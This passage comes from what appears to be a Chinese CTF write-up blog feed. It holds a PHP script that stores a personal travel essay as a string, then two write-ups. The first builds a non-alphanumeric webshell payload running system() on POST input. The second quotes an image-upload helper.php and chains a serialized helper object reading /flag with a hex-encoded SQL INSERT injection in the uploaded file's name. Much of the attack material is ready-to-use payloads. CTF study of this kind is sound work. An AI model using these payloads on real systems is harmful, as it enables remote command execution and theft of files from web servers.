string">'当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">mb_strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$st</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$st</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment">#取汉字的第一位</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token shell-comment comment">#$_GET['a']想要得到的字符</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$st</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span>      <span class="token comment">//~($st)[1]</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p><a href="https://www.leavesongs.com/THINK/answer.html?page=1">P神</a>      </p><p>上面的EXP使用方法      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/608d549c7d463779.png">     </p><p>构造payload<code>&lt;?=system($_POST[system]);&gt;</code><br>先构造数字1–&gt;<code>$__=[];$____=$__==$__;</code><br>system:<code>$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];</code>       </p><p>_POST:<code>$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];</code>       </p><p><code>system($_POST[system])</code>:<code>$_($$___[$_])</code>      </p><p>最终的payload：<code>&lt;?=$__=[];$____=$__==$__;$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];$_($$___[$_]);</code>    </p><p>flag不在根目录下，在环境变量中<code>env</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/dbbe16c2fd333a78.png">     </p><p>payload:<code>eval($_POST[1])</code>就不行，原因是PHP支持<code>变量函数</code>,也就是通过一个变量保存函数名，在变量后加上<code>()</code>即可调用函数；但是<code>eval</code>并不是一个函数，是PHP语法结构的一部分。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>getshell</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不是文件上传</title>
    <link href="/2021/05/15/BUU86/"/>
    <url>/2021/05/15/BUU86/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="__--__"></a><code>__--__</code></h2><p>题目说不是文件上传，看一下<code>www.zip</code>   </p><p>没有？？</p><p>看了WP，是<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png">   </p><p><code>github</code>上搜索得到源码<img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png">      </p><p>主要是<code>helper.php</code>    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"pic/"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span>     <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"config.txt"</span><span class="token punctuation">;</span>    <span class="token comment">// The function is not yet perfect, it is not open yet.</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"width"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"height"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;p>Please upload the correct image file!!!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'title'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'filename'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ext'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">folder</span><span class="token punctuation">.</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Connect MySQL Fail:"</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"`"</span><span class="token punctuation">.</span><span class="token variable">$key_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"`"</span><span class="token punctuation">;</span>            <span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"'"</span><span class="token punctuation">.</span><span class="token variable">$value_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"INSERT INTO images ("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">") VALUES("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">")"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token boolean constant">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span>            <span class="token comment">//The function is not yet perfect, it is not open yet.</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token shell-comment comment"># Read some config html</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>最后的这里可以利用<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png"></p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>     <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>然后是sql <code>insert </code> 注入   </p><p>正常上传图片的sql语句为<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIM截图20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p><p>其中title没有做什么处理<br>所以构造<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>文件名不能有双引号，所以进行十六进制编码    </p><p>上传图片，用burp改一下文件名，在<code>show.php</code>得到flag     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7518b270a41d8eaa.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>serialize</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wicctf</title>
    <link href="/2021/05/11/wicctf/"/>
    <url>/2021/05/11/wicctf/</url>
    
